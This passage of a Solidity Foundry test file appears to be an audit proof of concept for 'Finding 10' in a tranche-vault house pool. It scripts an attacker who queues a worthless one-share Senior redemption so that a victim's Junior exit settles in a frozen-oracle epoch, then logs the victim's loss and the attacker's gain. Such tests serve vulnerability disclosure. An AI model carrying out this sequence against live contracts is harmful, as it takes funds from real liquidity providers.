        uint256 unlock = seniorVault.lastDepositTime(SENIOR_ATTACKER) + seniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlock) {
            _advanceTo(unlock);
        }
        vm.prank(SENIOR_ATTACKER);
        seniorVault.transfer(SENIOR_DUST, 1);
        assertEq(seniorVault.balanceOf(SENIOR_DUST), 1);
    }

    function testFinding10_RecentOwnerPartialExitSensitivity() public {
        Stage memory stage = _stage();
        uint256 checkpoint = vm.snapshotState();
        Outcome memory delayed = _play(stage, true, false);
        assertTrue(vm.revertToState(checkpoint), "restore identical deployed state and LP requests");
        Outcome memory control = _play(stage, false, false);
        assertTrue(vm.revertToState(checkpoint), "restore again for a live rescue control");
        Outcome memory rescued = _play(stage, true, true);

        uint256 victimLoss = control.victimCash - delayed.victimCash;
        uint256 controlVictimTotal = control.victimCash + control.victimRetainedShareValue;
        uint256 delayedVictimTotal = delayed.victimCash + delayed.victimRetainedShareValue;
        uint256 victimNetLoss = controlVictimTotal - delayedVictimTotal;
        uint256 attackerExtra = delayed.attackerJuniorCash - control.attackerJuniorCash;
        uint256 attackerNet =
            delayed.attackerJuniorCash + delayed.attackerSeniorCash - JUNIOR_ATTACK_CAPITAL - SENIOR_ATTACK_CAPITAL;
        assertEq(delayed.attackerSeniorCash, control.attackerSeniorCash, "Senior claim is unchanged by dust");
        assertEq(rescued.victimCash, control.victimCash, "a second live pass eliminates victim loss");
        assertEq(rescued.victimRetainedShareValue, control.victimRetainedShareValue, "rescue restores residual value");
        assertEq(delayed.victimRetainedShares, control.victimRetainedShares, "owner retains equal shares");
        assertGt(victimLoss, 0, "frozen pass reduces independent owner cash");
        assertGt(victimNetLoss, 0, "owner remains worse after retained-share recapture");
        assertGt(attackerExtra, 0, "attacker entrant gains versus close-first control");
        console2.log("controlVictimCash", control.victimCash);
        console2.log("delayedVictimCash", delayed.victimCash);
        console2.log("victimCashLoss", victimLoss);
        console2.log("victimRetainedShares", delayed.victimRetainedShares);
        console2.log("controlVictimRetainedShareValue", control.victimRetainedShareValue);
        console2.log("delayedVictimRetainedShareValue", delayed.victimRetainedShareValue);
        console2.log("controlVictimCashPlusShares", controlVictimTotal);
        console2.log("delayedVictimCashPlusShares", delayedVictimTotal);
        console2.log("victimNetLossAfterRetainedShares", victimNetLoss);
        console2.log("controlAttackerJuniorCash", control.attackerJuniorCash);
        console2.log("delayedAttackerJuniorCash", delayed.attackerJuniorCash);
        console2.log("attackerExtraJuniorCash", attackerExtra);
        console2.log("attackerSeniorCash", delayed.attackerSeniorCash);
        console2.log("attackerNetAfterBothPrincipals", attackerNet);
        console2.log("rescuedVictimCash", rescued.victimCash);
    }

    function _stage() private returns (Stage memory stage) {
        _advanceTo(FIRST_REQUEST_TIME);
        uint256 seniorShares = seniorVault.balanceOf(SENIOR_ATTACKER);
        vm.prank(SENIOR_ATTACKER);
        stage.seniorHead = seniorVault.requestRedeem(seniorShares, SENIOR_ATTACKER, SENIOR_ATTACKER);
        assertEq(pool.lpEpochStart(stage.seniorHead), FREEZE_START - 2 hours, "payable Senior matures first");

        // The victim appears only in the later epoch, alongside the attacker's Senior dust request.
        _advanceTo(SECOND_REQUEST_TIME);
        vm.prank(KEEPER);
        router.updateMarkPrice(_basket(block.timestamp, block.timestamp - 1));
        stage.victimShares = VICTIM_REDEEM_SHARES;
        assertGt(juniorVault.balanceOf(VICTIM), stage.victimShares);
        vm.prank(VICTIM);
        stage.victimHead = juniorVault.requestRedeem(stage.victimShares, VICTIM, VICTIM);
        vm.startPrank(ATTACKER);
        usdg.approve(address(juniorVault), JUNIOR_ATTACK_CAPITAL);
        stage.attackerDepositHead = juniorVault.requestDeposit(JUNIOR_ATTACK_CAPITAL, ATTACKER, ATTACKER);
        vm.stopPrank();
        assertEq(stage.victimHead, stage.attackerDepositHead, "victim exit and attacker entry mature together");
        assertEq(pool.lpEpochStart(stage.victimHead), FREEZE_START - 1 hours);
    }

    function _play(
        Stage memory stage,
        bool queueDust,
        bool secondLivePass
    ) private returns (Outcome memory outcome) {
        uint256 dustHead;
        if (queueDust) {
            vm.prank(SENIOR_DUST);
            dustHead = seniorVault.requestRedeem(1, SENIOR_DUST, SENIOR_DUST);
            assertGt(dustHead, stage.seniorHead, "payable Senior head is one epoch earlier");
            assertEq(dustHead, stage.victimHead, "dust and victim mature in the same later hour");
            assertEq(seniorVault.estimateRedeemAssets(1), 0, "Senior dust has zero USDG quote");
        }

        _advanceTo(FREEZE_START - 1);
        assertFalse(engine.isOracleFrozen(), "first settlement is still live");
        if (queueDust) {
            assertEq(seniorVault.estimateRedeemAssets(1), 0, "dust is still zero at live settlement");
        }
        IHousePool.LpEpochSettlementResult memory first = _settle();
        assertGt(first.seniorFundedAssets, 0, "attacker's payable Senior head funds");
        assertEq(first.juniorDepositAssets, JUNIOR_ATTACK_CAPITAL, "attacker Junior entry activates");
        uint256 attackerShares = _claimDeposit(ATTACKER, juniorVault, stage.attackerDepositHead);
        assertGt(attackerShares, 0);
        uint256 seniorFunded = seniorVault.claimableRedeemRequest(stage.seniorHead, SENIOR_ATTACKER);
        uint256 seniorBalanceBefore = usdg.balanceOf(SENIOR_ATTACKER);
        vm.prank(SENIOR_ATTACKER);
        outcome.attackerSeniorCash =
            seniorVault.claimRedeem(stage.seniorHead, seniorFunded, SENIOR_ATTACKER, SENIOR_ATTACKER);
        assertEq(
            usdg.balanceOf(SENIOR_ATTACKER) - seniorBalanceBefore,
            outcome.attackerSeniorCash,
            "actual Senior USDG received"
        );

        if (queueDust) {
            assertTrue(first.seniorBacklog, "the worthless Senior head remains queued");
            assertTrue(first.juniorBacklog, "the victim is skipped despite available cash");
            (uint256 pendingHead, uint256 pendingShares) = seniorVault.getMaturedRedeemHead(first.cutoffEpoch);
            assertEq(pendingHead, dustHead, "the zero-value Senior head remains first");
            assertEq(pendingShares, 1, "the one-share head remains unprocessed");
            assertEq(seniorVault.estimateRedeemAssets(1), 0, "dust remains worthless after Senior burn");
            assertEq(juniorVault.claimableRedeemRequest(stage.victimHead, VICTIM), 0);
            outcome.liveVictimQuote = juniorVault.estimateRedeemAssets(stage.victimShares);
            if (secondLivePass) {
                IHousePool.LpEpochSettlementResult memory second = _settle();
                second;
                assertEq(
                    juniorVault.claimableRedeemRequest(stage.victimHead, VICTIM),
                    stage.victimShares,
                    "live rescue funds victim"
                );
            } else {
                // Keep the one-second boundary step explicit on an Arbitrum fork.
                vm.warp(FREEZE_START);
                vm.roll(vm.getBlockNumber() + 1);
                assertTrue(engine.isOracleFrozen(), "second settlement enters frozen regime");
                IHousePool.LpEpochSettlementResult memory second = _settle();
                assertEq(second.juniorFundedShares, stage.victimShares, "frozen pass funds victim");
            }
            assertEq(seniorVault.refundableRedeemRequest(dustHead, SENIOR_DUST), 1);
        } else {
            assertFalse(first.seniorBacklog, "no dust leaves Senior queue empty");
            assertEq(
                juniorVault.claimableRedeemRequest(stage.victimHead, VICTIM),
                stage.victimShares,
                "no-dust control pays victim live"
            );
        }

        uint256 fundedVictim = juniorVault.claimableRedeemRequest(stage.victimHead, VICTIM);
        uint256 victimBalanceBefore = usdg.balanceOf(VICTIM);
        vm.prank(VICTIM);
        outcome.victimCash = juniorVault.claimRedeem(stage.victimHead, fundedVictim, VICTIM, VICTIM);
        assertEq(usdg.balanceOf(VICTIM) - victimBalanceBefore, outcome.victimCash, "actual victim USDG received");
        if (block.timestamp < FREEZE_START) {
            _advanceTo(FREEZE_START);
        }
        outcome.victimRetainedShares = juniorVault.balanceOf(VICTIM);
        outcome.victimRetainedShareValue = juniorVault.convertToAssets(outcome.victimRetainedShares);

        _advanceTo(LIVE_REOPEN);
        assertFalse(engine.isOracleFrozen(), "FX market has reopened");
        vm.prank(ATTACKER);
        uint256 attackerExit = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        _advanceTo(pool.lpEpochStart(attackerExit));
        _settle();
        assertEq(juniorVault.claimableRedeemRequest(attackerExit, ATTACKER), attackerShares, "attacker fully exits");
        uint256 fundedAttacker = juniorVault.claimableRedeemRequest(attackerExit, ATTACKER);
        vm.prank(ATTACKER);
        outcome.attackerJuniorCash = juniorVault.claimRedeem(attackerExit, fundedAttacker, ATTACKER, ATTACKER);
        assertEq(usdg.balanceOf(ATTACKER), outcome.attackerJuniorCash, "actual attacker USDG received");
    }

    function _fund(
        address lp,
        TrancheVault vault,
        uint256 assets
    ) private {
        vm.startPrank(lp);
        usdg.approve(address(vault), assets);
        uint256 id = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        _advanceTo(pool.lpEpochStart(id));
        _settle();
        assertEq(vault.claimableDepositRequest(id, lp), assets);
        _claimDeposit(lp, vault, id);
    }

    function _claimDeposit(
        address lp,
        TrancheVault vault,
        uint256 id
    ) private returns (uint256 shares) {
        uint256 assets = vault.claimableDepositRequest(id, lp);
        vm.prank(lp);
        shares = vault.claimDeposit(id, assets, lp, lp);
    }

    function _settle() private returns (IHousePool.LpEpochSettlementResult memory result) {
        if (engine.isOracleFrozen() || !engine.terminalNavSnapshot().hasOpenPositions) {
            vm.prank(KEEPER);
            return pool.settleLpEpoch(0, 0);
        }
        vm.recordLogs();
        vm.prank(KEEPER);
        router.settleLpEpoch(_basket(block.timestamp, block.timestamp - 1));
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 signature = keccak256("LpEpochSettled(uint256,uint256,uint256,uint256,uint256,bool,bool,bool)");
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter != address(pool) || logs[i].topics[0] != signature) {
                continue;
            }
            result.cutoffEpoch = uint256(logs[i].topics[1]);
            (
                result.seniorFundedAssets,
                result.juniorFundedAssets,
                result.juniorDepositAssets,
                result.seniorDepositAssets,
                result.seniorBacklog,
                result.juniorBacklog,
                result.entriesDeferred
            ) = abi.decode(logs[i].data, (uint256, uint256, uint256, uint256, bool, bool, bool));
            return result;
        }
        revert("LpEpochSettled event missing");
    }

    function _advanceTo(
        uint256 timestamp
    ) private {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _basket(
        uint256 publishTime,
        uint256 previousTime
    ) private view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            bool inverted = i == 1 || i == 3 || i == 4 || i == 5;
            uint256 rawPrice = inverted ? (1e16 + basePrices[i] / 2) / basePrices[i] : basePrices[i];
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(rawPrice)),
                    conf: uint64(rawPrice * 998 / 1_000_000),
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: previousTime
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

}
```
